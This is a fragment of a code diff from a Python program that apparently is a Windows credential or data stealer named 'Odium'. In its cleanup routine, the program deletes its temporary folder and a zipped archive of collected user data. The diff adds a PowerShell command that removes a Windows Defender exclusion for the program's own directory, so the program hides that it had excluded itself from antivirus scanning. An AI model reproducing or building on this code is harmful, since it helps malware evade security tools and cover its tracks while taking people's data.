@@ -373,6 +373,7 @@ class main():
 			os.remove(os.path.join(self.tempfolder, file))
 		os.rmdir(self.tempfolder)
 		os.remove(os.path.join("C:/Users/"+os.getlogin(), os.getlogin()+"-Odium.zip"))
+		self.system(fr"powershell cd C:\; Remove-MpPreference -ExclusionPath {os.getcwd()}")
 		
 
 	def send(self):
